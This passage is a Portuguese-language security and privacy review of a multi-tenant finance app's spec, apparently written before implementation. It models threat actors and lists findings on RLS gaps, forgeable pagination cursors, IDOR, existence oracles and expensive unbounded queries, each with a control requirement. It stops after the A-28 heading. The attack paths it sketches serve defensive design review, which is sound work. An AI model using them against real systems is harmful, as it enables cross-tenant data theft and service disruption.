# Gate de risco sobre o spec — Mavia

- **Data:** 2026-09-01
- **Papéis:** `especialista-seguranca-appsec` (Parte A) · `especialista-lgpd-compliance` (Parte B)
- **Objeto auditado:** `CLAUDE.md` §2 (regras 16–20) · `CONTEXT.md` · ADR 0003 · ADR 0004 · `docs/arquitetura/sistema.md` · `docs/produto/arquitetura-informacao.md` · `docs/pesquisa/organizze-teardown.md` §7
- **Momento:** antes de existir código. É onde estes dois papéis agem.
- **Status:** ⛔ **REPROVADO** — ver §C.

Convenções deste documento:

- **Severidade:** `Crítico` (bloqueia o épico e possivelmente o produto) · `Alto` (bloqueia o ticket) · `Médio` (entra no épico com prazo) · `Baixo` (registro).
- Cada achado tem **ID estável** (`A-nn` / `B-nn`). Os IDs são a referência que vai para o ticket e para o teste do `engenheiro-qa-automacao`.
- **Requisito de controle** está redigido em voz de ticket: sujeito, verbo, critério verificável. Se não puder virar asserção, não está escrito.
- Ausência de decisão é achado. "Não está no spec" e "está errado no spec" recebem o mesmo tratamento neste gate, porque produzem o mesmo código.

---
---

# PARTE A — Segurança de aplicação (AppSec)

Referência: OWASP ASVS 4.0. O que segue é o modelo de ameaças **deste** spec, não uma lista genérica.

## A.0 Modelo de ameaças — quem ataca a Mavia e por onde

Cinco agentes de ameaça concretos, cada um com o ativo que persegue:

| # | Agente | Objetivo | Superfície mais provável |
|---|---|---|---|
| **T1** | Assinante legítimo curioso ou malicioso | Ler o espaço de outro assinante | `X-Mavia-Tenant`, `:id` em rota, cursor de paginação, `sync/mudancas?desde=`, storage de anexo/exportação |
| **T2** | Atacante externo sem conta | Obter as credenciais bancárias de todos os tenants de uma vez | Upload de OFX/CSV/PDF (XXE/SSRF/leitura de arquivo) → KEK no host → `conexoes.credenciais_cifradas` |
| **T3** | Sessão roubada (phishing, XSS, aparelho perdido) | Exfiltrar tudo de um tenant rapidamente | `POST /exportacoes`, `GET /lancamentos` em massa, token MCP/chave de API |
| **T4** | Membro do espaço familiar (T1 com acesso legítimo parcial) | Escalar de `visualizador`/`membro` para `proprietario`, ou ler o que não deveria após sair | `PATCH /tenants/:id/membros/:usuarioId`, ausência de matriz de papéis, histórico anterior à entrada |
| **T5** | Agente de IA conectado (MCP) ou integrador com chave de API | Ler ou escrever além do escopo autorizado, indefinidamente | Módulo `mcp`, "Chaves de API", ausência de prazo e de log de leitura |

O ativo de maior valor do sistema é **a KEK**, porque ela destrava as credenciais bancárias de *todos* os tenants — é o único ativo do spec cujo comprometimento não é proporcional ao acesso obtido. Todo o resto vaza um tenant por vez; a KEK vaza a base inteira. O caminho T2 (upload → leitura de arquivo → KEK) é, por isso, o cenário que este gate trata como prioridade máxima.

---

## A.1 Isolamento — RLS, `tenant_id`, privilégio elevado

O ADR 0004 e a §3.9 do `sistema.md` são, no conjunto, a parte mais bem resolvida do spec: `FORCE ROW LEVEL SECURITY`, `WITH CHECK` obrigatório, `SET LOCAL` por transação (não `SET SESSION`), nenhum papel de requisição com `BYPASSRLS`, segunda camada de filtro na aplicação, UUID v4 não sequencial, e teste de dois tenants obrigatório em toda rota. Isso está certo e não é comum estar certo. Os achados abaixo são as bordas que ficaram de fora.

### A-01 · `Crítico` · O poller do `outbox` contradiz o veto de `BYPASSRLS`

**O que está errado.** §3.6 define `outbox (id BIGSERIAL, tipo, payload JSONB, criado_em, publicado_em)` — **sem `tenant_id`**. §3.8 confirma: `CREATE INDEX ON outbox (publicado_em) WHERE publicado_em IS NULL`, com o comentário "fila, não negócio" — um índice que deliberadamente não lidera por `tenant_id`, violando a regra declarada duas linhas acima na mesma seção. §5.1 define um poller a cada 1 s sobre `outbox WHERE publicado_em IS NULL`, ou seja, uma varredura **global, cross-tenant**. §3.9 e §8.5 vetam qualquer papel que atenda requisição ou job com `BYPASSRLS`.

As três afirmações não podem ser simultaneamente verdadeiras. Ou o `outbox` não tem RLS — e então existe uma tabela de negócio, com `payload JSONB` contendo descrição e valor de lançamentos de todos os clientes, sem isolamento e fora da regra 16 —, ou tem RLS e o poller não enxerga nada.

**Por que é crítico.** É exatamente a "falha silenciosa" que o ADR 0004 nomeia como sua consequência negativa mais perigosa. E a resolução ingênua em código (dar `BYPASSRLS` ao worker "só para o outbox") derruba o isolamento do worker inteiro, que é quem executa sincronização, promoção de brutos, OCR e exportação.

**Requisito de controle.**
> `outbox` recebe `tenant_id UUID NOT NULL`, RLS habilitada com `FORCE`, e o índice de fila passa a `(tenant_id, publicado_em) WHERE publicado_em IS NULL`. O poller **não** varre a tabela globalmente: ele enumera tenants com trabalho pendente por uma tabela-agulha `outbox_pendencias (tenant_id PK, tem_pendencia BOOL)` mantida por trigger, ou por `LISTEN/NOTIFY` com o `tenant_id` no payload da notificação, e então abre uma transação por tenant com `SET LOCAL app.tenant_id`. Nenhum papel de banco ganha `BYPASSRLS`. Critério de aceite: com `mavia_jobs` conectado e `app.tenant_id` não definido, `SELECT count(*) FROM outbox` retorna 0.

### A-02 · `Alto` · Tabelas sem `tenant_id` e sem policy declarada: `sessoes`, `usuarios`, `outbox`

**O que está errado.** §3.1 declara `usuarios` "global, não tenant-scoped" e `sessoes (usuario_id, refresh_hash, dispositivo, expira_em, revogada_em)` sem coluna de tenant e **sem nenhuma policy**. §3.9 resolve `usuarios` e `tenants` com uma frase ("policy por `app.usuario_id` e checagem em `tenant_usuarios`") e **esquece `sessoes` por completo**. `sessoes` guarda o material que permite personificar qualquer usuário da plataforma. Não há sequer a definição de onde `app.usuario_id` é setado, por quem, e em que ordem em relação a `app.tenant_id`.

**Requisito de controle.**
> Escrever as policies de `usuarios`, `sessoes`, `tenant_usuarios` e `tenants` explicitamente no spec, em SQL, com `FORCE ROW LEVEL SECURITY` e `WITH CHECK`. `sessoes`: `USING (usuario_id = current_setting('app.usuario_id', true)::uuid)`. `app.usuario_id` e `app.tenant_id` são definidos juntos, por `SET LOCAL`, no mesmo ponto de entrada (`tenancy.withTenant`), e a unidade de trabalho falha em vez de executar se algum dos dois estiver ausente. Critério de aceite (S2): uma transação sem `SET LOCAL` lança erro em vez de retornar linhas.

### A-03 · `Alto` · A validação de `X-Mavia-Tenant` é o ponto cego do modelo

**O que está errado.** §4 diz: "`tenant_id` vem do token, e quando o usuário pertence a mais de um tenant, do header `X-Mavia-Tenant`, sempre validado contra `tenant_usuarios`". A validação acontece **antes** de `app.tenant_id` existir — é a consulta que decide o valor dele. Portanto ela roda ou sem contexto de tenant, ou com o contexto do tenant *anterior* se a conexão for reaproveitada. Nada no spec descreve essa ordem. É o lugar canônico onde o isolamento de um SaaS multi-tenant falha, e o ADR 0004 diz textualmente que essa falha é silenciosa.

**Requisito de controle.**
> A resolução de tenant é uma etapa nomeada e isolada: (1) autentica e obtém `usuario_id` do token; (2) abre transação com `SET LOCAL app.usuario_id`, **sem** `app.tenant_id`; (3) consulta `tenant_usuarios` sob a policy de `app.usuario_id` para obter papel e pertencimento do tenant pedido; (4) se e somente se houver linha, define `app.tenant_id` e o papel no `TenantContext` para o resto da requisição. Ausência de `X-Mavia-Tenant` com múltiplos tenants é **erro 400**, nunca escolha implícita do primeiro. Testes de S2: (a) header com tenant do qual o usuário não é membro → 403 e zero linhas lidas; (b) duas requisições seguidas na mesma conexão de pool, tenants diferentes, a segunda não enxerga dado da primeira; (c) header com UUID malformado → 400 antes de qualquer consulta.

### A-04 · `Médio` · `mavia_migrate` é separado por política, não por mecanismo

**O que está errado.** §3.9 dá `BYPASSRLS` a `mavia_migrate` e o restringe com "nunca serve requisição, uso registrado em `auditoria`". Numa VPS única com `docker-compose`, a separação típica evapora: a mesma `DATABASE_URL`, o mesmo `.env`, a mesma imagem. Se o container da API consegue ler a credencial de migrate, o veto de `BYPASSRLS` é uma convenção de código, não um controle.

**Requisito de controle.**
> A credencial de `mavia_migrate` não existe no ambiente do processo HTTP nem do worker: ela é injetada apenas no *job* de migration do pipeline de deploy, com `pg_hba.conf` restringindo o papel à rede/host do runner de deploy. Critério de aceite: `docker compose exec api env | grep -i migrate` retorna vazio; e uma tentativa de conexão como `mavia_migrate` a partir do container da API é recusada pelo Postgres, não pela aplicação.

### A-05 · `Médio` · O worker enumera todos os tenants — leitura cross-tenant legítima, mas irrestrita

**O que está errado.** §3.9: "`mavia_jobs` — lê `tenants` para enumerar; define `app.tenant_id` a cada tenant". Isso é necessário para os crons (`saldo.reconciliar`, `fatura.fechar`, `alertas.avaliar`), mas cria um papel com leitura ampla sobre `tenants` sem limite de colunas. Se `tenants` ganhar qualquer coluna de contato, cobrança ou nome de titular no épico 11, ela passa a ser legível por qualquer código do worker.

**Requisito de controle.**
> A enumeração acontece por uma view `tenants_ativos (id, timezone, plano)` com `security_invoker`, e `mavia_jobs` recebe `SELECT` **apenas** nessa view, nunca na tabela. Toda coluna nova de `tenants` nasce fora da view por padrão. Critério de aceite: `SELECT * FROM tenants` como `mavia_jobs` é negado.

### A-06 · `Médio` · Índices únicos de idempotência não são unicidade real sob soft delete

**O que está errado.** §3.8: `CREATE UNIQUE INDEX ON lancamentos (tenant_id, lancamento_bruto_id) WHERE lancamento_bruto_id IS NOT NULL AND deleted_at IS NULL`. O predicado `deleted_at IS NULL` é correto para o produto, mas significa que **soft-deletar um lançamento libera a chave** — reimportar o mesmo OFX depois de excluir cria a linha de novo. Isso é defensável como produto, mas o spec afirma em §5.2 que "reimportar o mesmo OFX não duplica nada (regra 13)", o que passa a ser falso nesse caminho. É um caso de abuso barato: excluir, reimportar, repetir, para inflar contagens ou disparar recategorização/OCR N vezes.

**Requisito de controle.**
> Declarar explicitamente o comportamento desejado no spec e travá-lo com teste em S2: reimportar um arquivo cujos brutos já existem em `lancamentos_brutos` é **sempre** no-op na tabela `lancamentos_brutos` (cuja unicidade **não** filtra por `deleted_at`), independentemente do estado dos `lancamentos` promovidos; a repromoção de um bruto cujo lançamento foi excluído exige ação explícita do usuário e é registrada em `auditoria`.

### A-07 · `Alto` · `GET /metricas` e `GET /saude` estão na superfície pública sem autorização, e uma das métricas carrega centavos

**O que está errado.** §4.1 lista `GET /saude` e `GET /metricas` (Prometheus) no mesmo grupo de rotas `/v1` das demais, sem nenhuma menção de autenticação. §5.2 define a métrica `mavia_saldo_divergencia_centavos`. Uma métrica Prometheus com valor monetário, se rotulada por `tenant_id` ou `conta_id` (o padrão instintivo), publica valor de transação e identificador de cliente num endpoint sem sessão — violação direta da regra 20, e um oráculo de atividade por tenant para T1 e T3.

**Requisito de controle.**
> `/metricas` escuta em porta e interface separadas (`127.0.0.1` ou rede interna do compose), nunca é roteado pelo Traefik para a internet, e exige credencial. Nenhuma métrica recebe `tenant_id`, `conta_id`, `usuario_id` ou e-mail como *label* — cardinalidade por tenant é proibida por razão de privacidade antes de ser por razão de custo. `mavia_saldo_divergencia_centavos` vira um contador de **ocorrências** de divergência e um histograma de ordem de grandeza (faixas), não o valor. `/saude` responde apenas `{status}`, sem versão, sem nome de host, sem estado de dependências.

### A-08 · `Baixo` · `auditoria.id BIGSERIAL` é um contador global exposto pela paginação

**O que está errado.** §3.6 usa `BIGSERIAL` em `auditoria`, e §4.2 pagina `atividades` por keyset com cursor "base64 do par". O par de `atividades` é `(ocorrido_em, id)`. Duas leituras espaçadas revelam quantas escritas financeiras a plataforma inteira recebeu no intervalo — informação comercial da Mavia, não do cliente, mas ainda assim vazamento por desenho de identificador, contrariando o espírito do ADR 0004 ("identificadores expostos são não sequenciais").

**Requisito de controle.**
> O cursor de `atividades` não expõe `auditoria.id` em claro (ver A-09, que resolve os dois com HMAC). Alternativa aceitável: ordenar por `(ocorrido_em, id)` mantendo `BIGSERIAL` interno, mas serializar no cursor apenas o `ocorrido_em` mais um discriminador por tenant.

---

## A.2 A paginação keyset vaza existência de registro de outro tenant?

Resposta direta à pergunta: **não vaza linha, mas vaza sinal — e o cursor não é o que o spec diz que é.**

A consulta de listagem é `WHERE tenant_id = current_setting('app.tenant_id') AND (posted_at, id) < (cursor)` sob RLS com `FORCE`. Um cursor forjado com o `(posted_at, id)` de um lançamento de outro tenant é apenas um par de valores de comparação: o predicado de RLS continua eliminando as linhas alheias. Nenhum dado de outro tenant é retornado. Até aqui, o desenho está correto e a escolha do keyset (§4.2) é bem justificada.

Os três problemas são de implementação previsível, e por isso pertencem ao spec:

### A-09 · `Alto` · O cursor é declarado "opaco" mas é base64 — reversível, forjável e não vinculado ao tenant

**O que está errado.** §4.2: "O cursor é opaco (base64 do par)". Base64 é codificação, não opacidade. Consequências: (a) o cliente pode fabricar qualquer `posted_at` e qualquer `id`; (b) o `id` viaja em claro, o que só é inócuo porque é UUID v4; (c) nada amarra o cursor ao tenant nem ao filtro que o gerou, então um cursor emitido para o filtro X pode ser reapresentado com o filtro Y — comportamento indefinido no spec, e a fonte natural de "sumiu um lançamento ao rolar", que o próprio §4.2 diz ser o pior sintoma possível num produto financeiro.

**Requisito de controle.**
> O cursor é `base64url(payload) || '.' || HMAC-SHA256(payload, chave_de_servico)`, com `payload = {posted_at, id, hash_do_filtro, tenant_id}`. O servidor recusa (400) cursor com MAC inválido, com `tenant_id` diferente do contexto, ou com `hash_do_filtro` diferente do filtro da requisição corrente. O payload é validado por Zod (`zCursor`) **antes** de tocar o SQL: `posted_at` precisa parsear como instante, `id` como UUID. Vale para `lancamentos`, `atividades` e `lancamentos_brutos`.

### A-10 · `Médio` · Resolver o cursor por lookup de `id` transforma a paginação em oráculo de existência

**O que está errado.** A implementação padrão de keyset em ORM busca o registro âncora por `id` para descobrir sua chave de ordenação. Se `lancamentos` for consultado por `id` e a resposta distinguir "cursor inválido / registro não encontrado" de "página vazia", o atacante T1 obtém um oráculo: dado um UUID obtido por qualquer outro canal (log, print, URL compartilhada, resposta de erro), ele confirma se aquele lançamento **existe** — em outro tenant. É informação de existência atravessando a fronteira que o produto inteiro promete não atravessar.

**Requisito de controle.**
> A resolução do cursor é puramente aritmética: os valores de `posted_at` e `id` vêm do payload assinado e entram direto na comparação de tupla. É proibido consultar a tabela pelo `id` do cursor. Além disso, as respostas de erro de paginação são indistinguíveis: cursor inválido, cursor de outro tenant e página vazia produzem a mesma forma de resposta observável (200 com lista vazia para cursor válido sem resultados; 400 genérico para cursor malformado, sem revelar qual verificação falhou). Teste de abuso: `AB-03`.

### A-11 · `Médio` · Timing e contagem: o resumo é um canal lateral mais barato que a lista

**O que está errado.** `GET /lancamentos/resumo` agrega o período inteiro numa consulta. Ele é executado com o mesmo filtro da lista, aceita intervalos arbitrários e retorna números. Não vaza dado de outro tenant (RLS), mas é o endpoint mais caro por requisição do produto e não tem teto de janela nem rate limit declarado — ver A-22.

**Requisito de controle.** Coberto por A-22 (teto de janela + rate limit por rota cara).

---

## A.3 IDOR rota a rota — a superfície de API do `sistema.md` §4.1

**Achado estrutural, que precede todos os outros desta seção:**

### A-12 · `Crítico` · A matriz de autorização não existe em nenhum documento

**O que está errado.** `domain/politica-acesso` expõe `pode(papel, acao, recurso): boolean` (§1.1) e §2.3 promete testar "autorização por papel" em S2 com dois exemplos (`visualizador` não escreve; `membro` não muda billing). `CONTEXT.md` define três papéis com descrições de uma linha. **Em lugar nenhum existe a tabela papel × ação × recurso.** Sem ela, `pode()` nasce como uma função vazia e cada rota decide sozinha — que é a definição operacional de "endpoint sem autorização explícita no servidor", meu primeiro item de veto.

O sintoma já está visível no próprio spec: §7 (ADR 0013 proposta) diz que reabrir fatura é "restrito a `proprietario`", mas §4.1 lista `POST /faturas/:id/reabrir` sem qualquer marca de autorização. A regra existe num documento e não no outro. Multiplique por 90 rotas.

**Requisito de controle.**
> Criar `docs/arquitetura/autorizacao.md` com uma tabela normativa **de todas as rotas de §4.1 mais as de §6.3**, com quatro colunas: rota · papéis permitidos · verificação de propriedade além do tenant · exige reautenticação. A tabela é a fonte da tabela de `politica-acesso.pode()`. Um `Guard` global do Nest **nega por padrão**: rota sem declaração explícita de autorização não sobe (falha no boot, não em runtime). Critério de aceite (S2): um teste parametrizado percorre o manifesto de rotas do OpenAPI gerado por `contracts` e falha se alguma rota não tiver entrada na tabela.

### A.3.1 Percurso rota a rota

Legenda: **RLS** = o isolamento de tenant do ADR 0004 cobre; **Papel** = falta declaração de papel; **Dono** = falta verificação de propriedade *além* do tenant; **Ø** = rota sem contrato declarado.

| Rota | Cobertura hoje | Achado |
|---|---|---|
| `POST /auth/registrar` · `/entrar` · `/senha/recuperar` | — | **A-13** — sem rate limit, sem bloqueio progressivo, sem antienumeração |
| `POST /auth/refresh` | — | **A-14** — sem rotação nem detecção de reuso |
| `POST /auth/sair` | — | **A-15** — não há "encerrar todas as sessões", embora a tela prometa |
| `GET /auth/eu` | — | **A-16** — retorna "identidade + tenants + papel"; se incluir e-mail dos demais membros, é vazamento entre titulares (ver B-14) |
| *(MFA)* | — | **A-17** — `usuarios.mfa_segredo_cifrado` existe na tabela; **nenhuma rota de MFA existe** |
| `POST /tenants` | — | **A-18** — sem limite de criação por usuário |
| `GET /tenants/:id/membros` · `POST /tenants/:id/convites` · `PATCH /tenants/:id/membros/:usuarioId` · `DELETE /tenants/:id/membros/:usuarioId` | **nenhuma** | **A-19 — IDOR de tenant explícito.** `:id` vem do path, não do token |
| `GET /contas` · `POST` · `GET /contas/:id` · `PATCH` · `/arquivar` | RLS | Papel |
| `GET /contas/saldos?em=` | RLS | **A-22** — `em` arbitrário, cálculo sobre todo o histórico, sem teto |
| `GET /cartoes` · `POST` · `PATCH` · `/arquivar` · `/faturas` | RLS | Papel |
| `GET /faturas/:id` · `/lancamentos` · `POST /faturas/:id/fechar` | RLS | Papel |
| `POST /faturas/:id/reabrir` | RLS | **A-20** — o spec exige `proprietario` em §7 e não declara em §4.1 |
| `POST /faturas/:id/pagamentos` | RLS | Papel — cria transferência; `visualizador` jamais |
| `GET/POST/PATCH /categorias` · `/arquivar` · `/etiquetas` | RLS | Papel |
| `GET /lancamentos` · `/resumo` · `/agenda` | RLS | **A-09**, **A-22** |
| `POST /lancamentos` · `GET /lancamentos/:id` · `PATCH` · `DELETE` · `/efetivar` · `/desefetivar` | RLS | Papel. `GET /lancamentos/:id` está correto por RLS, mas o teste que prova isso precisa existir por rota, não por amostragem |
| `POST /lancamentos/lote` | RLS | **A-21** — sem teto de itens; exclusão em massa em uma chamada |
| `POST /transferencias` · `GET /transferencias/:id` · `DELETE /transferencias/:id` | RLS | **A-23** — nada impede `DELETE /lancamentos/:id` sobre **uma perna** |
| `POST /parcelamentos` · `GET` · `PATCH` · `DELETE` | RLS | Papel |
| `GET/POST/PATCH/DELETE /recorrencias` · `/ocorrencias?ate=` | RLS | **A-22** — `ate` arbitrário materializa série ilimitada |
| `GET /planejamentos` · `PUT` · `/copiar` · `DELETE` | RLS | Papel |
| `GET /objetivos` · `POST` · `PATCH` · `POST /objetivos/:id/aportes` · `/arquivar` | RLS | **A-24** — o aporte referencia um `lancamento_id` do corpo |
| `GET /relatorios/*` (5 rotas) | RLS | **A-22** — período arbitrário, agregação sem teto |
| `POST /importacoes` (upload) | RLS | **A.4 inteira** |
| `GET /importacoes/:id/brutos` | RLS | **A-25** — devolve `payload JSONB` cru da fonte, sem redação |
| `POST /importacoes/:id/promover` | RLS | Papel |
| `GET /conexoes` · `POST /conexoes` · `/sincronizar` · `DELETE` · `/sincronizacoes` | RLS | **A.5 e B.6** |
| `GET /conciliacoes` · `/aceitar` · `/rejeitar` | RLS | Papel |
| `GET /atividades` | RLS | **A-26** — expõe ações de outros membros e `ip_hash`; papel não declarado |
| `GET /alertas` · `POST /alertas/:id/lido` · `GET/PUT /alertas/preferencias` | RLS | **A-27** — `notificacoes` é por `usuario_id`; `/lido` de notificação de **outro membro** do mesmo tenant passa pela RLS |
| `GET /preferencias` · `PUT` | RLS | Idem — PK é `(tenant_id, usuario_id)`; RLS sozinha não impede escrever a preferência de outro membro |
| `POST /exportacoes` · `GET /exportacoes/:id` | RLS | **A-28** — exfiltração total em uma chamada; sem reautenticação, sem alerta, sem rate limit |
| `GET /saude` · `GET /metricas` | **nenhuma** | **A-07** |
| `POST /sync/mutacoes` · `GET /sync/mudancas?desde=` | **Ø** | **A-29** — o próprio §6.3 admite que não estão em `contracts` |
| `GET /inteligencia/sugerir-categoria` | **Ø** | **A-30** (e B-18) |
| `POST /anexos` | **Ø** | **A-31** — aparece no mapa tela→endpoint, não existe em §4.1 |
| MCP / Chaves de API | **Ø** | **A.6 inteira** |

### A-13 · `Alto` · Autenticação sem rate limit, bloqueio progressivo ou antienumeração

**Requisito de controle.**
> `POST /auth/entrar`: no máximo 5 tentativas por `(e-mail)` e 20 por IP em 15 min, com atraso progressivo (0/1/2/4/8 s) e bloqueio de 15 min após o teto; o contador vive no Redis com chave por hash do e-mail, nunca o e-mail em claro. `POST /auth/registrar` e `/senha/recuperar` respondem **sempre** a mesma mensagem e no mesmo tempo (±50 ms), existindo ou não o e-mail. `senha_hash` é Argon2id com parâmetros declarados no spec (m=64 MiB, t=3, p=1 como piso) e verificação de senha vazada contra lista local (k-anonymity offline, sem chamada a terceiro). Teste de abuso: `AB-01`.

### A-14 · `Alto` · Refresh token sem rotação nem detecção de reuso

**O que está errado.** `sessoes` tem `refresh_hash`, `expira_em`, `revogada_em` — a estrutura permite rotação, mas o spec não a exige. Sem rotação, um refresh roubado vale até expirar; sem detecção de reuso, o roubo é indetectável.

**Requisito de controle.**
> Cada `POST /auth/refresh` invalida o refresh apresentado e emite um novo (`refresh_hash` = SHA-256 de token com ≥256 bits de entropia). Sessões formam uma **família** (`sessoes.familia_id`): apresentar um refresh já rotacionado revoga a família inteira, registra em `auditoria` e dispara notificação ao titular. Access token ≤ 15 min. Teste: `AB-02`.

### A-15 · `Alto` · Sessão revogável só na teoria

**O que está errado.** `docs/produto` §2.12 promete "Segurança (senha, 2FA, sessões, biometria)". Não existe `GET /auth/sessoes` nem `DELETE /auth/sessoes/:id` nem `POST /auth/sair-de-todos` em §4.1. Uma tela sem endpoint é uma promessa sem mecanismo — e revogação de sessão é pré-requisito de resposta a incidente (art. 48 LGPD, ver B-13).

**Requisito de controle.**
> Adicionar `GET /auth/sessoes` (lista: dispositivo, IP mascarado, último uso, corrente sim/não), `DELETE /auth/sessoes/:id` e `POST /auth/sessoes/revogar-todas`. Troca de senha revoga todas as sessões exceto a corrente, obrigatoriamente. Revogação tem efeito ≤ 60 s mesmo com access token válido em circulação (lista de revogação no Redis consultada no guard, ou access token ≤ 5 min — decidir e escrever).

### A-17 · `Alto` · MFA existe como coluna e não como funcionalidade

**O que está errado.** `usuarios.mfa_segredo_cifrado` está no modelo de dados. Não há: rota de inscrição, rota de verificação, política de códigos de recuperação, decisão sobre TOTP vs. WebAuthn, e — o mais grave para este gate — **com que chave o segredo é cifrado**, já que o esquema de envelope encryption de §3.5 é por `Conexao` e não cobre `usuarios`. O agente exige "MFA disponível" e "biometria no mobile como conveniência, nunca como única barreira" (a §6.2 do mapa de telas lista "Login + biometria" sem qualquer amarração a uma sessão do servidor).

**Requisito de controle.**
> Especificar MFA no spec: TOTP (RFC 6238) como piso, 10 códigos de recuperação de uso único gerados no ato e exibidos uma vez, `mfa_segredo_cifrado` sob a mesma KEK do envelope (com `kek_version`, ver A-33), MFA obrigatório para as ações de A-28 e A-19. Biometria no mobile desbloqueia um refresh token guardado no Keychain/Keystore com `SecAccessControl`/`setUserAuthenticationRequired`; nunca substitui a validação no servidor, e nunca guarda a senha.

### A-19 · `Crítico` · `/tenants/:id/*` — IDOR de tenant e escalada de papel

**O que está errado.** Quatro rotas recebem `:id` de tenant **no path**, enquanto todo o resto do sistema deriva o tenant do token/header. Duas fontes de verdade para a mesma coisa é a receita clássica de IDOR: a RLS protege as *linhas*, mas quem decide que `app.tenant_id` = `:id` é a aplicação. `PATCH /tenants/:id/membros/:usuarioId` altera papel — se não verificar que o autor é `proprietario` **e** que não está alterando a si mesmo, um `membro` se promove. `DELETE /tenants/:id/membros/:usuarioId` permite remover o último `proprietario` (tenant órfão) ou remover o proprietário legítimo por escalada.

**Requisito de controle.**
> (1) `:id` de tenant é validado contra o tenant do contexto de sessão; divergência é 403, nunca troca de contexto. (2) `PATCH` e `DELETE` de membro exigem `proprietario`; um usuário não altera o próprio papel; a remoção que deixaria o tenant sem nenhum `proprietario` ativo é rejeitada por constraint, não por `if`. (3) Promover a `proprietario` e remover membro exigem reautenticação (senha ou MFA) e geram entrada em `auditoria` e notificação a todos os proprietários. (4) `POST /tenants/:id/convites` emite token de uso único, ≥128 bits, validade 7 dias, vinculado ao e-mail convidado, revogável; aceitar convite exige que o e-mail autenticado seja o convidado. Testes: `AB-04`, `AB-05`.

### A-21 · `Alto` · `POST /lancamentos/lote` sem teto é exclusão em massa em uma requisição

**Requisito de controle.**
> Teto de 500 ids por chamada, validado por Zod. A autorização é verificada **por item**, não por lote. A operação inteira ocorre em uma transação: ou tudo aplica, ou nada. Toda operação de lote grava **uma** entrada em `auditoria` com a lista de ids afetados e a ação. Lote que exclui mais de 50 lançamentos dispara notificação ao titular (`alertas`), pelo mesmo raciocínio de A-28.

### A-22 · `Alto` · Endpoints caros sem teto de janela e sem rate limit

**O que está errado.** `GET /lancamentos/resumo`, `GET /relatorios/*` (5 rotas), `GET /contas/saldos?em=`, `GET /recorrencias/:id/ocorrencias?ate=` e `GET /lancamentos/agenda` aceitam períodos arbitrários. `de=1900-01-01&ate=2100-12-31` em cinco abas de relatório, em paralelo, derruba uma VPS. `ocorrencias?ate=` materializa uma série no servidor. O spec só menciona rate limit na fila `externa` (§5), e ali é para proteger o *provider*, não a Mavia.

**Requisito de controle.**
> `zFiltroLancamentos` e os schemas de relatório validam janela máxima de 5 anos e `de <= ate`. `ocorrencias?ate=` tem horizonte máximo de 24 meses. Rate limit por `(usuario_id, rota)`: 60 req/min nas rotas de leitura simples, 10 req/min nas agregadas, 3/h em `POST /exportacoes` e `POST /importacoes`. `statement_timeout` de 5 s para o papel `mavia_app` e 60 s para `mavia_jobs`, definidos no papel de banco e não por chamada.

### A-23 · `Alto` · `DELETE /lancamentos/:id` sobre uma perna de transferência quebra a partida dobrada

**O que está errado.** §3.4 declara constraint **deferida** de soma zero e "exatamente 2 pernas vivas" em `transferencias`. §4.1 expõe `DELETE /lancamentos/:id` genérico. Nada no spec proíbe apontá-lo para uma perna. Se a constraint deferida cobrir o caso, o usuário recebe um erro de banco críptico; se não cobrir (soft delete não é `DELETE`, e uma constraint sobre "pernas vivas" precisa considerar `deleted_at` — o spec não diz que considera), o sistema fica com uma transferência de uma perna só, ou seja, dinheiro criado ou destruído. É simultaneamente achado de segurança (integridade) e de domínio.

**Requisito de controle.**
> `DELETE /lancamentos/:id` recusa (409, erro tipado `LANCAMENTO_PERTENCE_A_TRANSFERENCIA`) qualquer lançamento com `transfer_group_id` não nulo, orientando a usar `DELETE /transferencias/:id`. A constraint de soma zero e de duas pernas considera explicitamente `deleted_at IS NULL`. Mesmo tratamento para parcela isolada (`installment_group_id`), coerente com a invariante já escrita em `CONTEXT.md` ("Excluir uma parcela isolada é proibido"). Teste: `AB-06`.

### A-24 · `Médio` · `POST /objetivos/:id/aportes` recebe `lancamento_id` do corpo

**Requisito de controle.**
> A rota valida no servidor: o lançamento existe no tenant (RLS cobre), não está vinculado a outro objetivo (invariante já escrita), o objetivo é do modo "por aportes", e a moeda coincide. A resposta a um `lancamento_id` inexistente e a um de outro tenant é **idêntica** (404), para não criar oráculo de existência.

### A-25 · `Alto` · `GET /importacoes/:id/brutos` devolve o `payload JSONB` cru da instituição

**O que está errado.** `lancamentos_brutos.payload JSONB` é "o registro cru como veio da fonte". Num OFX real isso inclui número da conta, agência, identificadores do banco, e frequentemente a chave Pix da contraparte (que é CPF, telefone ou e-mail de um **terceiro**). A tela de Importação (§2.10, passo 3) precisa mostrar data, descrição e valor — não o payload. Devolver o objeto inteiro por API é PII em resposta de API, e regra 20 proíbe isso em log; devolver por endpoint é pior, porque o cliente também o registra.

**Requisito de controle.**
> `zBrutoResposta` em `contracts` é uma **allowlist**: `id, posted_at, descricao_origem, valor, moeda, status, marca(novo|duplicado|conciliar)`. O `payload` bruto nunca sai da API, em nenhuma rota, para nenhum papel. Se houver necessidade de diagnóstico, ela é atendida por acesso operacional auditado ao banco, não por endpoint. Teste: `AB-07` (asserção de schema que falha se o campo `payload` aparecer na resposta).

### A-26 · `Médio` · `GET /atividades` sem papel declarado, expondo ações e `ip_hash` de outros membros

**Requisito de controle.**
> Declarar na matriz: `proprietario` vê todas as atividades do espaço; `membro` e `visualizador` veem todas as atividades do espaço **exceto** as de segurança/conta (login, troca de senha, sessões, membros, billing), que são visíveis apenas ao próprio autor e aos proprietários. `ip_hash` e `user_agent_hash` **nunca** saem em resposta de API para nenhum papel — existem para investigação, não para exibição.

### A-27 · `Médio` · Recursos por `usuario_id` dentro do tenant: a RLS não é suficiente

**O que está errado.** `notificacoes` e `preferencias` têm chave por `(tenant_id, usuario_id)`. A RLS isola o tenant, e portanto **um membro pode marcar como lida a notificação de outro** ou sobrescrever a preferência de outro, e nada no spec impede. Este é o IDOR *intra-tenant*, que o modelo de RLS não vê por construção — vale a pena registrar porque o time vai assumir que "a RLS resolve".

**Requisito de controle.**
> Toda rota sobre recurso cuja chave inclui `usuario_id` verifica `usuario_id = TenantContext.usuarioAtual()` no servidor, além da RLS. Vale para `alertas/:id/lido`, `preferencias`, `sessoes`. Enunciar no spec a regra geral: **RLS isola tenants; propriedade dentro do tenant é responsabilidade explícita da rota.** Teste: `AB-08`.

### A-28 · `Crítico` · `POST /exportacoes` é exfiltração total do tenant em uma chamada

